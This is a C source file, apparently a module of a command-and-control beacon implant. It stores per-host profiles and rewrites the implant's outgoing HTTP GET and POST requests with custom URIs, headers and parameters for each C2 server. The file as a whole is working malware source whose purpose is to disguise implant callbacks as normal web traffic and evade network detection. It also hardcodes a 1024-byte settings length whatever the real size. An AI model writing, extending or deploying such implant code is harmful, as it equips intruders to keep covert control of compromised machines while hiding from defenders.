#include <winsock2.h>
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include "beacon.h"
#include "parse.h"
#include "profile.h"
#include "hostprof.h"

#define HP_MAX 8
#define HP_HOST 1
#define HP_GET_URI 5
#define HP_GET_PARAM 6
#define HP_GET_HEADER 7
#define HP_POST_URI 10
#define HP_POST_PARAM 11
#define HP_POST_HEADER 12

typedef struct {
	char host[128];
	char get_uri[256];
	char post_uri[256];
	char get_headers[1024];
	char get_params[512];
	char post_headers[1024];
	char post_params[512];
} hp_entry;

static hp_entry hp_table[HP_MAX];
static int hp_n;

static void hp_append_header(char * dst, int max, const char * src) {
	char line[512];
	const char * colon;
	if (src == NULL || src[0] == '\0')
		return;
	memset(line, 0, sizeof(line));
	colon = strchr(src, ':');
	if (colon == NULL) {
		const char * eq = strchr(src, '=');
		if (eq != NULL && (eq - src) < 64)
			_snprintf(line, sizeof(line) - 1, "%.*s: %s\r\n", (int)(eq - src), src, eq + 1);
		else
			_snprintf(line, sizeof(line) - 1, "%s\r\n", src);
	}
	else {
		if (strstr(src, "\r\n") != NULL)
			_snprintf(line, sizeof(line) - 1, "%s", src);
		else
			_snprintf(line, sizeof(line) - 1, "%s\r\n", src);
	}
	if ((int)strlen(dst) + (int)strlen(line) < max - 1)
		strcat(dst, line);
}

static void hp_append_param(char * dst, int max, const char * src) {
	char tmp[512];
	if (src == NULL || src[0] == '\0')
		return;
	if (src[0] == '?')
		src++;
	memset(tmp, 0, sizeof(tmp));
	if (dst[0] == '\0')
		_snprintf(tmp, sizeof(tmp) - 1, "?%s", src);
	else
		_snprintf(tmp, sizeof(tmp) - 1, "%s&%s", dst, src);
	tmp[sizeof(tmp) - 1] = '\0';
	if ((int)strlen(tmp) < max)
		memcpy(dst, tmp, strlen(tmp) + 1);
}

void hostprof_reload(void) {
	datap parser;
	char * blob;
	unsigned int blen;
	hp_entry * cur = NULL;

	memset(hp_table, 0, sizeof(hp_table));
	hp_n = 0;
	blob = setting_ptr(SETTING_HOST_PROFILES);
	if (blob == NULL)
		return;
	blen = 1024;
	data_init(&parser, blob, (int)blen);
	while (parser.length >= 4) {
		unsigned short type = data_short(&parser);
		unsigned short slen = data_short(&parser);
		char * s;
		if (type == 0)
			break;
		if (slen == 0)
			continue;
		s = data_ptr(&parser, slen);
		if (s == NULL)
			break;
		if (type == HP_HOST) {
			if (hp_n >= HP_MAX)
				break;
			cur = &hp_table[hp_n++];
			memset(cur, 0, sizeof(*cur));
			strncpy(cur->host, s, sizeof(cur->host) - 1);
			continue;
		}
		if (cur == NULL)
			continue;
		switch (type) {
		case HP_GET_URI:
			strncpy(cur->get_uri, s, sizeof(cur->get_uri) - 1);
			break;
		case HP_POST_URI:
			strncpy(cur->post_uri, s, sizeof(cur->post_uri) - 1);
			break;
		case HP_GET_HEADER:
			hp_append_header(cur->get_headers, (int)sizeof(cur->get_headers), s);
			break;
		case HP_POST_HEADER:
			hp_append_header(cur->post_headers, (int)sizeof(cur->post_headers), s);
			break;
		case HP_GET_PARAM:
			hp_append_param(cur->get_params, (int)sizeof(cur->get_params), s);
			break;
		case HP_POST_PARAM:
			hp_append_param(cur->post_params, (int)sizeof(cur->post_params), s);
			break;
		default:
			break;
		}
	}
}

static hp_entry * hp_find(const char * hostname) {
	int i;
	if (hostname == NULL)
		return NULL;
	for (i = 0; i < hp_n; i++) {
		if (_stricmp(hp_table[i].host, hostname) == 0)
			return &hp_table[i];
	}
	return NULL;
}

void hostprof_apply(const char * hostname, profile * p, int is_post) {
	hp_entry * e;
	if (p == NULL)
		return;
	e = hp_find(hostname);
	if (e == NULL)
		return;
	if (!is_post) {
		if (e->get_uri[0])
			_snprintf(p->uri, 1024, "%s", e->get_uri);
		if (e->get_headers[0]) {
			_snprintf(p->stage, 1024, "%s%s", p->headers, e->get_headers);
			memcpy(p->headers, p->stage, 1024);
		}
		if (e->get_params[0]) {
			if (p->parameters[0] == 0)
				_snprintf(p->parameters, 1024, "%s", e->get_params);
			else {
				/* e->get_params already starts with '?' — splice as '&' tail */
				char * extra = e->get_params;
				if (extra[0] == '?')
					extra++;
				_snprintf(p->stage, 1024, "%s&%s", p->parameters, extra);
				memcpy(p->parameters, p->stage, 1024);
			}
		}
	}
	else {
		if (e->post_uri[0])
			_snprintf(p->uri, 1024, "%s", e->post_uri);
		if (e->post_headers[0]) {
			_snprintf(p->stage, 1024, "%s%s", p->headers, e->post_headers);
			memcpy(p->headers, p->stage, 1024);
		}
		if (e->post_params[0]) {
			if (p->parameters[0] == 0)
				_snprintf(p->parameters, 1024, "%s", e->post_params);
			else {
				char * extra = e->post_params;
				if (extra[0] == '?')
					extra++;
				_snprintf(p->stage, 1024, "%s&%s", p->parameters, extra);
				memcpy(p->parameters, p->stage, 1024);
			}
		}
	}
}

int hostprof_count(void) {
	return hp_n;
}

const char * hostprof_host_at(int index) {
	if (index < 0 || index >= hp_n)
		return NULL;
	return hp_table[index].host;
}

const char * hostprof_get_uri_at(int index) {
	if (index < 0 || index >= hp_n)
		return NULL;
	return hp_table[index].get_uri;
}

const char * hostprof_post_uri_at(int index) {
	if (index < 0 || index >= hp_n)
		return NULL;
	return hp_table[index].post_uri;
}
